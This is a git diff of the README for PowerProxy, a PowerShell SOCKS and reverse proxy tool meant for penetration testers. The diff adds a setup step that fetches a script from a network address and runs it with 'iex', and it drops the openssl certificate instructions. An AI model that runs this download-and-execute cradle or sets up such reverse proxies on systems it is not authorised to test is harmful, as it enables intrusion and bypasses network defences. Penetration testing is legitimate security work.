@@ -4,20 +4,15 @@ PowerShell SOCKS proxy with reverse proxy capabilities.
 PowerProxy is written with penetration testers in mind. Reverse proxy functionality is a priority, for traversing networks that block inbound connections. Reverse proxy connections are encrypted by default. Username/Password authentication is supported for Socks 5 connections.
 
 ## Setup
-Import the script as a module:
+Import the script:
 
 ```powershell
+iex (new-object net.webclient).downloadstring("http://192.168.0.22/PowerProxy.ps1") 
+# OR
 Import-Module \\192.168.0.22\Public\PowerProxy.ps1
 ```
 
-Optionally, create your own certificate for the reverse proxy handler:
-
-```bash
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem
-
-# If you want to verify the cert's fingerprint when connecting from powershell:
-openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":"
-```
+reverse_proxy_handler.py can create temporary SSL certs, which requires OpenSSL. If OpenSSL isn't installed on your machine (it is on most Linux/Unix-based systems), provide your own cert or use the *--no-encrypt* option.
 
 ## Usage
 
